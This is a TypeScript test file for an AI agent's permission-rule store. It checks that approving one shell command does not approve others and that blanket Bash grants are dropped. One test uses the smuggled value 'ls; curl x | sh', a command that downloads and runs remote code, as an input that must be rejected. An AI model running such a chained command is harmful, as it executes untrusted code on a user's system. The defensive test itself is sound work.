import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  PermissionRuleStore,
  permissionRuleKey,
  permissionRuleScope,
} from './permission-rule-store';

const electron: { userData: string } = vi.hoisted(() => ({ userData: '' }));

vi.mock('electron', () => ({
  app: { getPath: (): string => electron.userData },
}));

describe('permissionRuleScope', () => {
  it('remembersAnOrdinaryTool_forAnyUse', () => {
    expect(permissionRuleScope('create_file', 'src/a.ts')).toBe('tool');
    expect(permissionRuleKey('create_file', 'src/a.ts')).toBe('create_file');
  });

  it('remembersACommandTool_forItsExactCommand', () => {
    // #979: "Always" on `ls` must not allow every later command.
    expect(permissionRuleScope('write_terminal_input', 'ls')).toBe('command');
    expect(permissionRuleKey('Bash', 'npm test')).not.toBe(permissionRuleKey('Bash', 'npm test2'));
    expect(permissionRuleKey('Bash', 'npm test')).not.toBe('Bash');
  });

  it('remembersACommandTool_forTheSessionOnly_whenTheCommandIsNotWhole', () => {
    const clamped: string = `${'x'.repeat(117)}...`;

    expect(permissionRuleScope('Bash', clamped)).toBe('session');
    expect(permissionRuleKey('Bash', clamped)).toBeNull();
    expect(permissionRuleScope('run_active_document', '')).toBe('session');
  });
});

describe('PermissionRuleStore', () => {
  beforeEach(() => {
    electron.userData = mkdtempSync(join(tmpdir(), 'permission-rules-'));
  });

  afterEach(() => {
    rmSync(electron.userData, { recursive: true, force: true });
  });

  it('allowsOnlyTheRememberedCommand', () => {
    const store: PermissionRuleStore = new PermissionRuleStore();
    store.remember(permissionRuleKey('Bash', 'ls') ?? '', 'always', null);

    expect(store.isAllowed(permissionRuleKey('Bash', 'ls') ?? '', '/repo')).toBe(true);
    expect(store.isAllowed(permissionRuleKey('Bash', 'ls; curl x | sh') ?? '', '/repo')).toBe(
      false,
    );
  });

  it('forgetsAnOlderGrantThatAllowedACommandToolOutright', () => {
    const file: string = join(electron.userData, 'agent-permission-rules.json');
    writeFileSync(
      file,
      JSON.stringify({
        always: ['Bash', 'create_file'],
        workspaces: { '/repo': ['write_terminal_input', 'delete_path'] },
      }),
    );
    const store: PermissionRuleStore = new PermissionRuleStore();

    expect(store.isAllowed('Bash', null)).toBe(false);
    expect(store.isAllowed('write_terminal_input', '/repo')).toBe(false);
    expect(store.isAllowed('create_file', null)).toBe(true);
    expect(store.isAllowed('delete_path', '/repo')).toBe(true);
    expect(JSON.parse(readFileSync(file, 'utf8'))).toEqual({
      always: ['create_file'],
      workspaces: { '/repo': ['delete_path'] },
    });
  });
});
